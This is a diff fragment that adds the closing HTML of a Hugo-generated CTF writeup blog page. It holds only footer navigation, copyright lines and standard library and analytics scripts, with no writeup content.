+    <span class="item-content">CaptureAmerica @ CTF フラxxグゲット</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">LastMod</span>
+    <span class="item-content">
+        2020-04-06
+        
+    </span>
+  </p>
+  
+  
+</div>
+<footer class="post-footer">
+      <div class="post-tags">
+          <a href="https://captureamerica.github.io/writeups/tags/ctf/">CTF</a>
+          </div>
+      <nav class="post-nav">
+        
+        <a class="next" href="https://captureamerica.github.io/writeups/post/tamuctf_2020/">
+            <span class="next-text nav-default">TAMU CTF 2020 Writeup | フラxxグゲット</span>
+            <span class="next-text nav-mobile">Next</span>
+            <i class="iconfont icon-right"></i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+        </div>
+        
+
+  
+
+  
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="social-links">
+      <a href="https://github.com/CaptureAmerica/" class="iconfont icon-github" title="github"></a>
+  <a href="https://captureamerica.github.io/writeups/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+</div>
+
+<div class="copyright">
+  <span class="power-by">
+    Powered by <a class="hexo-link" href="https://gohugo.io">Hugo</a>
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    Theme - 
+    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
+  </span>
+
+  
+
+  <span class="copyright-year">
+    &copy; 
+    2019 - 
+    2020
+    <span class="heart">
+      <i class="iconfont icon-heart"></i>
+    </span>
+    <span class="author">CaptureAmerica @ CTF フラxxグゲット</span>
+  </span>
+</div>
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
+  
+<script type="text/javascript" src="https://captureamerica.github.io/writeups/dist/even.26188efa.min.js"></script>
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-104910699-2', 'auto');
+	ga('set', 'anonymizeIp', true);
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+
+
+
+
+
+</body>
+</html>
